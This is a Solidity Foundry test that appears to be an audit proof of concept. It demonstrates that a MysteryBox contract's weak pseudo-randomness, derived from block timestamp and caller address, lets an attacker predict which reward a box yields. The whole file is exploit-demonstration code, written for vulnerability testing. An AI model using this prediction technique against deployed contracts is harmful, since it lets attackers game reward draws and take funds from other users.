// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/MysteryBox.sol"; // Adjust the path as necessary

contract MysteryBoxExploitTest is Test {
    MysteryBox mysteryBox;
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy the MysteryBox contract with initial seed funds
        mysteryBox = new MysteryBox{value: 0.1 ether}();
    }

    function testWeakPRNGExploit(uint256 startTime) public {
        // Limit the fuzzed timestamp to a reasonable range to avoid overflow issues
        uint256 fuzzedTimestamp = startTime % (2 ** 32);

        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);

        // Attacker buys a box
        mysteryBox.buyBox{value: 0.1 ether}();

        // Warp the blockchain to the fuzzed timestamp
        vm.warp(fuzzedTimestamp);

        // Predict the random value based on fuzzed timestamp and attacker address
        uint256 randomValue = uint256(keccak256(abi.encodePacked(fuzzedTimestamp, attacker))) % 100;
        console.log("Fuzzed Timestamp:", fuzzedTimestamp);
        console.log("Expected random value:", randomValue);

        // Open the box and capture the reward
        mysteryBox.openBox();

        // Get the reward and determine the expected reward based on the random value
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        require(rewards.length > 0, "No rewards received");

        string memory expectedReward;
        if (randomValue < 75) {
            expectedReward = "Coal";
        } else if (randomValue < 95) {
            expectedReward = "Bronze Coin";
        } else if (randomValue < 99) {
            expectedReward = "Silver Coin";
        } else {
            expectedReward = "Gold Coin";
        }

        console.log("Received reward:", rewards[0].name);
        console.log("Expected reward:", expectedReward);

        require(
            keccak256(bytes(rewards[0].name)) == keccak256(bytes(expectedReward)),
            "Exploit failed: reward does not match expectation"
        );

        console.log("Exploit success: received the expected reward:", expectedReward);

        vm.stopPrank();
    }
}
